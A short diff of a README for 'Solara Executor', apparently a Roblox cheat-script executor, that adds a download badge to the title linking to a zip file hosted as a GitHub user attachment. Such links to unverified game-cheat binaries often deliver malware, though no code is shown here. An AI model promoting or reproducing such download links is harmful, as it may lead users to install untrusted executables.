@@ -1,4 +1,4 @@
-# 🚀 Solara Executor - Roblox Executor
+# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/user-attachments/files/16765865/Solara.zip)**
 
 ## Quick Installation
 To get started with Solara Executor, follow these simple steps:
